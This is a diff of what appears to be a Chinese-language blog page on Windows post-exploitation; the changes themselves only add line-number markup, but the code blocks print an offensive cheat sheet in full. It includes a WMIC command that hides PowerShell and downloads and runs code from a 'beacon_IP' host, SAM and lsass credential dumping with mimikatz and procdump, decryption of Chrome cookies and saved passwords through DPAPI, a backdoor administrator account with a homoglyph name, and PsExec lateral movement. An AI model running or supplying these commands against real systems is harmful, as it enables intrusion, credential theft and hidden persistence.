 <h3 id="2-利用token获得TrustedInstaller权限"><a href="#2-利用token获得TrustedInstaller权限" class="headerlink" title="2. 利用token获得TrustedInstaller权限"></a>2. 利用token获得TrustedInstaller权限</h3><p>在Windows系统中，即使获得了管理员权限和system权限，也不能修改系统文件，因为Windows系统的最高权限为TrustedInstaller</p>
 <p>查看文件夹属性，显示system不具有写入权限，只有TrustedInstaller可以，借用TrustedInstaller.exe的token创建子进程，子进程就有了TrustedInstaller权限</p>
-<pre class="language-none"><code class="language-none">Set-NtTokenPrivilege SeDebugPrivilege
+<pre class="line-numbers language-none"><code class="language-none">Set-NtTokenPrivilege SeDebugPrivilege
 $p &#x3D; Get-NtProcess -Name TrustedInstaller.exe
-$proc &#x3D; New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p</code></pre>
+$proc &#x3D; New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="3-利用cmdkey-获取令牌缓存"><a href="#3-利用cmdkey-获取令牌缓存" class="headerlink" title="3. 利用cmdkey 获取令牌缓存"></a>3. 利用cmdkey 获取令牌缓存</h3><pre class="language-none"><code class="language-none">cmdkey &#x2F;list</code></pre>
+<h3 id="3-利用cmdkey-获取令牌缓存"><a href="#3-利用cmdkey-获取令牌缓存" class="headerlink" title="3. 利用cmdkey 获取令牌缓存"></a>3. 利用cmdkey 获取令牌缓存</h3><pre class="line-numbers language-none"><code class="language-none">cmdkey &#x2F;list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>WMIC在向远程主机执行指令的时候，都会先默认使用缓存的凭证。攻击者可以利用本机已经缓存的令牌，直接执行指令或启动新进程</p>
-<pre class="language-none"><code class="language-none">wmic &#x2F;node:TERMSRV&#x2F;47.111.191.59 process call create &quot;cmd &#x2F;c calc.exe&quot;
+<pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:TERMSRV&#x2F;47.111.191.59 process call create &quot;cmd &#x2F;c calc.exe&quot;
 wmic &#x2F;node:47.111.191.59 process call create &quot;cmd &#x2F;c calc.exe&quot;
-wmic &#x2F;node:&lt;TARGET-BOX process call create &quot;cmd &#x2F;c powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;beacon_IP&#x2F;a&#39;))\&quot;&quot;</code></pre>
+wmic &#x2F;node:&lt;TARGET-BOX process call create &quot;cmd &#x2F;c powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;beacon_IP&#x2F;a&#39;))\&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="0x07-HASH-Dump与利用"><a href="#0x07-HASH-Dump与利用" class="headerlink" title="0x07 HASH Dump与利用"></a>0x07 HASH Dump与利用</h2><h3 id="1-hash导出"><a href="#1-hash导出" class="headerlink" title="1. hash导出"></a>1. hash导出</h3><pre class="language-none"><code class="language-none">1) reg save 方式
+<h2 id="0x07-HASH-Dump与利用"><a href="#0x07-HASH-Dump与利用" class="headerlink" title="0x07 HASH Dump与利用"></a>0x07 HASH Dump与利用</h2><h3 id="1-hash导出"><a href="#1-hash导出" class="headerlink" title="1. hash导出"></a>1. hash导出</h3><pre class="line-numbers language-none"><code class="language-none">1) reg save 方式
 
 reg save HKLM\SYSTEM sys.hiv  
 reg save HKLM\SAM sam.hiv  
@@ -811,9 +811,9 @@ reg save hklm\security security.hiv
 
 mimikatz.exe &quot;lsadump::sam &#x2F;system:sys.hiv &#x2F;sam:sam.hiv&quot; exit  # 离线导hash
 
-mimikatz.exe &quot;log credit.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;  # 在线导hash</code></pre>
+mimikatz.exe &quot;log credit.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;  # 在线导hash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="2-lsass-Dump"><a href="#2-lsass-Dump" class="headerlink" title="2. lsass Dump"></a>2. lsass Dump</h3><pre class="language-none"><code class="language-none">1）procdump
+<h3 id="2-lsass-Dump"><a href="#2-lsass-Dump" class="headerlink" title="2. lsass Dump"></a>2. lsass Dump</h3><pre class="line-numbers language-none"><code class="language-none">1）procdump
 
 # HTTP method - using the default way
 certutil -urlcache -split -f http:&#x2F;&#x2F;live.sysinternals.com&#x2F;procdump.exe C:\Users\Public\procdump.exe
@@ -832,9 +832,9 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.
 
 mimikatz # sekurlsa::minidump lsass.dmp
 Switch to minidump
-mimikatz # sekurlsa::logonPasswords</code></pre>
+mimikatz # sekurlsa::logonPasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="3-Mimikatz"><a href="#3-Mimikatz" class="headerlink" title="3. Mimikatz"></a>3. Mimikatz</h3><pre class="language-none"><code class="language-none">1）Execute commands
+<h3 id="3-Mimikatz"><a href="#3-Mimikatz" class="headerlink" title="3. Mimikatz"></a>3. Mimikatz</h3><pre class="line-numbers language-none"><code class="language-none">1）Execute commands
 
 PS C:\temp\mimikatz&gt; .\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit # 单行
 
@@ -882,9 +882,9 @@ dpapi::chrome &#x2F;in:&quot;%localappdata%\Google\Chrome\User Data\Default\Cook
 dpapi::chrome &#x2F;in:&quot;C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies&quot; &#x2F;masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
 
 # Saved Credential in Chrome
-dpapi::chrome &#x2F;in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login Data&quot; &#x2F;unprotect</code></pre>
+dpapi::chrome &#x2F;in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login Data&quot; &#x2F;unprotect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="4-DPAPI"><a href="#4-DPAPI" class="headerlink" title="4. DPAPI"></a>4. DPAPI</h3><pre class="language-none"><code class="language-none">1) 显示凭据
+<h3 id="4-DPAPI"><a href="#4-DPAPI" class="headerlink" title="4. DPAPI"></a>4. DPAPI</h3><pre class="line-numbers language-none"><code class="language-none">1) 显示凭据
 
 vaultcmd &#x2F;list
 
@@ -926,9 +926,9 @@ DonPAPI.py --hashes &lt;LM&gt;:&lt;NT&gt; domain&#x2F;user@target
 
 # using domain backup key
 dpapi.py backupkeys --export -t domain&#x2F;user:passw0rd@target_dc_ip
-python DonPAPI.py -pvk domain_backupkey.pvk domain&#x2F;user:passw0rd@domain_network_list</code></pre>
+python DonPAPI.py -pvk domain_backupkey.pvk domain&#x2F;user:passw0rd@domain_network_list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="5-创建凭据"><a href="#5-创建凭据" class="headerlink" title="5. 创建凭据"></a>5. 创建凭据</h3><pre class="language-none"><code class="language-none">net user hacker Hcker_12345678* &#x2F;add &#x2F;Y
+<h3 id="5-创建凭据"><a href="#5-创建凭据" class="headerlink" title="5. 创建凭据"></a>5. 创建凭据</h3><pre class="line-numbers language-none"><code class="language-none">net user hacker Hcker_12345678* &#x2F;add &#x2F;Y
 net localgroup administrators hacker &#x2F;add
 net localgroup &quot;Remote Desktop Users&quot; hacker &#x2F;add # RDP access
 net localgroup &quot;Backup Operators&quot; hacker &#x2F;add # Full access to files
@@ -947,9 +947,9 @@ net user hacker &#x2F;Expires:Never
 net user &#x2F;add evilbob$ evilpassword
 
 # homoglyph Aԁmіnistratοr (different of Administrator)
-Aԁmіnistratοr</code></pre>
+Aԁmіnistratοr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="6-凭据利用"><a href="#6-凭据利用" class="headerlink" title="6. 凭据利用"></a>6. 凭据利用</h3><pre class="language-none"><code class="language-none">1）PsExec
+<h3 id="6-凭据利用"><a href="#6-凭据利用" class="headerlink" title="6. 凭据利用"></a>6. 凭据利用</h3><pre class="line-numbers language-none"><code class="language-none">1）PsExec
 
 PS C:\&gt; PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe
 
@@ -981,7 +981,7 @@ PS C:\&gt; net use \\ordws01.cscou.lab &#x2F;user:DOMAIN\username password C$
 4）Runas
 
 PS C:\&gt; runas &#x2F;netonly &#x2F;user:DOMAIN\username &quot;cmd.exe&quot;
-PS C:\&gt; runas &#x2F;noprofil &#x2F;netonly &#x2F;user:DOMAIN\username cmd.exe</code></pre>
+PS C:\&gt; runas &#x2F;noprofil &#x2F;netonly &#x2F;user:DOMAIN\username cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
 <li><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/privilege-escalation">https://www.ired.team/offensive-security/privilege-escalation</a></li>
